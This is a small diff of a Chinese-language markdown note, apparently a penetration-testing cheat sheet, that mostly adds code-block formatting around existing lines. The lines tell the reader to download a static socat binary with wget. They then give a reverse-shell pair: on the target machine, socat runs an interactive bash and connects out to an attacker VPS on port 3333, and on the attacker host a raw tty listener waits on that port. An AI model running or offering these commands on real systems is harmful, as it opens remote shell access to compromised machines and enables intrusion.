@@ -10,8 +10,12 @@ https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux
 
 直接wget https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat
 
+```
+
 靶机：socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:vps:3333
+
 主机：socat file:`tty`,raw,echo=0 tcp-listen:3333
+```
 
 
 
